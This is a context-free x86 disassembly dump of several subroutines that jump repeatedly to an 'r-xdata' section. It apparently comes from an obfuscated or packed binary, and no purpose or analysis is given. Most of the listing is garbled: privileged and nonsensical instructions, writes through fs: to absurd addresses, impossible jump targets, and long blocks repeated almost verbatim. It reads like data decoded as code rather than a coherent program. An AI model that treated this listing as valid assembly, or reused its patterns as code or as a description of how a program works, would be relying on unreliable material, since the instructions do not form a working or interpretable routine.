xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff842897d1
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a2b6
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcefd8
jno r-xdata
jge 0xffffffffffa0a317
jge r-xdata
jpe 0x74cd2f1b
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401e90
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcaa0da
jno r-xdata
js 0x7f44e299
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158a2b6
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea2aa
pop edx
jge r-xdata
jo 0xffffffff854f77d3
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_401e90
jb 0xffffffff81b29b46
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c32cc4
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jge r-xdata
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jg r-xdata
sub edi 0xf681b871
jne r-xdata
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jg r-xdata
ja 0xffffffffff9b9f81
pop ecx
jne r-xdata
jbe 0xffcefd8
jno r-xdata
and ebx 0x870f4975
jno r-xdata
jge 0xffffffffffa0a317
jae r-xdata
xor esi 0xe681cd75
jge r-xdata
jpe 0x74cd2f1b
add esp 0x4
jae r-xdata
jl 0xf3a05c
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7755
add [ eax ] al
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff842897d1
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_401ef4
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_401ff1
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_401f32
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x586614ab
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a4e3
push esp
push eax
call sub_401fd8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c12e73
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_401f55
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a4e3
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x586614ab
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c12e73
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
push esp
push eax
call sub_401fd8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_401f58
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a4e3
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_401fd8
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_401f6f
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119a6b2
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd2f1b
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a4e3
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x586614ab
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_401fd8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c12e73
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_401f88
pop ecx
pop edx
ja r-xdata
pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c12e73
jl 0xffffffffc1c152b5
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x586614ab
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a4e3
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
add esp 0x4
jno r-xdata
iretd
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_401fd8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133ae32
add [ eax ] al
jno 0xf9a7985
sub_401f91
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119a6b2
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd2f1b
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a4e3
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_401fd8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c12e73
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_401fd8
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_401fd8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
